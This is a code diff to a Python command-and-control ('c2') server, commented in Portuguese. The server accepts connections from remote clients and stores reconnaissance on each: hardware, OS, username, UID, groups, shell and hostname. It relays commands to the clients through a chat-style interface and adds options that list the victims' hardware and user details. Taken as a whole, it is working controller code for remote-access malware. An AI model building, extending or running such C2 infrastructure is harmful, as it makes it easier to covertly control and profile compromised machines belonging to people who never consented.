@@ -36,6 +36,26 @@ def cliente_existe_livre(index: int):
 
     return False
 
+# Função para receber dados de um cliente
+def receber_dados(index):
+    # Recebendo dados até que o buffer recebido seja menor que o
+    # tamanho máximo de buffer
+    retorno = ''
+    try:
+        dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+    except:
+        return ''
+    retorno += dados
+
+    while (not len(dados) < TAMANHO_BUFFER):
+        try:
+            dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
+        except:
+            return ''
+        retorno += dados
+
+    return retorno
+
 # Função para testar se um cliente, identificado pelo seu índice,
 # está online
 def cliente_online(index: int):
@@ -54,27 +74,15 @@ def cliente_online(index: int):
     try:
         clientes[index][0][0].send("alive?".encode(CHARSET))
     except:
-        clientes[index][1].release()
         print(f"Cliente {clientes[index][0][1]} desconectado!")
         clientes[index][0][0].close()
         clientes.pop(index)
         return index
 
-    # Tentando obter resposta do cliente e, em caso de exceção,
-    # destrava-se as transmissões do cliente, finaliza-se o socket do
-    # cliente, remove-se o mesmo da lista de clientes e retorna-se o
-    # índice
-    try:
-        resposta = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
-    except:
-        print(f"Cliente {clientes[index][0][1]} desconectado!")
-        clientes[index][0][0].close()
-        clientes.pop(index)
-        return index
-
-    # Se o tamanho da resposta do cliente for menor que 1, finaliza-se
-    # o socket do cliente, remove-se o mesmo da lista de clientes e
-    # retorna-se o índice
+    # Obtendo resposta do cliente e , se o tamanho da resposta do
+    # cliente for menor que 1, finaliza-se o socket do cliente,
+    # remove-se o mesmo da lista de clientes e retorna-se o índice
+    resposta = receber_dados(index)
     if (len(resposta) < 1):
         print(f"Cliente {clientes[index][0][1]} desconectado!")
         clientes[index][0][0].close()
@@ -147,10 +155,32 @@ def gerenciar_servidor():
             clientes.append([server_sock.accept(), threading.Lock()])
         except:
             continue
+
+        # Obtendo e armazenando informações do cliente recém-conectado
+        clientes[-1][1].acquire()
+        informacoes = receber_dados(-1).split('\n')
+        if (len(informacoes) < 2):
+            clientes[-1][0][0].close()
+            clientes.pop(-1)
+            continue
         clientes[-1].append({
             "momento_conexao": time.time(),
-            "ultima_verificacao": 0
+            "ultima_verificacao": 0,
+            "socket": f"{clientes[-1][0][1][0]}:{clientes[-1][0][1][1]}",
+            "nome_cpu": informacoes[0],
+            "nucleos_cpu": informacoes[1],
+            "ram": informacoes[2],
+            "disco": informacoes[3],
+            "so": informacoes[4],
+            "usuario": informacoes[5],
+            "home": informacoes[6],
+            "uid": informacoes[7],
+            "grupo_principal": informacoes[8],
+            "grupos": informacoes[9],
+            "shell": informacoes[10],
+            "nome_host": informacoes[11]
         })
+        clientes[-1][1].release()
 
         print(f"Cliente {clientes[-1][0][1]} conectado!")
 
@@ -172,6 +202,8 @@ def aguardar_verificacao(index: int):
 # Função para responder mensagem informando desconexão de cliente
 # e finalizar o socket do mesmo
 def informar_desconectado(index: int, retorno: dict):
+    global clientes
+
     retorno["text"] = f"Cliente {clientes[index][0][1]} desconectado!"
     requisicoes.responder_mensagem(retorno)
     print(f"Cliente {clientes[index][0][1]} desconectado!")
@@ -179,26 +211,6 @@ def informar_desconectado(index: int, retorno: dict):
     clientes.pop(index)
 
     return
-
-# Função para receber dados de um cliente
-def receber_dados(index):
-    # Recebendo dados até que o buffer recebido seja menor que o
-    # tamanho máximo de buffer
-    retorno = ''
-    try:
-        dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
-    except:
-        raise Exception()
-    retorno += dados
-
-    while (not len(dados) < TAMANHO_BUFFER):
-        try:
-            dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
-        except:
-            raise Exception()
-        retorno += dados
-
-    return retorno
 
 def main():
     # Armazenando, globalmente, variável de continuidade da execução
@@ -274,7 +286,7 @@ def main():
             requisicoes.responder_mensagem(retorno)
             continue
         elif (tokens[1] == "-l"):
-            retorno["text"] = "./c2 -l"
+            retorno["text"] = funcoes.obter_clientes(clientes)
             requisicoes.responder_mensagem(retorno)
             continue
         elif (tokens[1] == "-s"):
@@ -306,6 +318,14 @@ def main():
 Digite `./c2 -l` para obter a lista de IDs disponíveis"""
             requisicoes.responder_mensagem(retorno)
             continue
+        elif (tokens[1] == "-d"):
+            retorno["text"] = funcoes.obter_hardware(clientes, index)
+            requisicoes.responder_mensagem(retorno)
+            continue
+        elif (tokens[1] == "-u"):
+            retorno["text"] = funcoes.obter_usuario(clientes, index)
+            requisicoes.responder_mensagem(retorno)
+            continue
 
         # Testando se o cliente está disponível para receber mensagem e,
         # se o mesmo deixar de existir, informa-se desconexão do mesmo
@@ -324,17 +344,9 @@ Digite `./c2 -l` para obter a lista de IDs disponíveis"""
             informar_desconectado(index, retorno)
             continue
 
-        # Tentando receber mensagem do cliente e, em caso de exceção,
-        # destrava-se as transmissões para o mesmo e informa-se desconexão
-        # do mesmo
-        try:
-            retorno["text"] = receber_dados(index)
-        except:
-            informar_desconectado(index, retorno)
-            continue
-
-        # Se o tamanho da resposta for menor que 1, informa-se desconexão
-        # do cliente
+        # Obtendo resposta do cliente e, se o tamanho da resposta for
+        # menor que 1, informa-se desconexão do cliente
+        retorno["text"] = receber_dados(index)
         if (len(retorno["text"]) < 1):
             informar_desconectado(index, retorno)
             continue
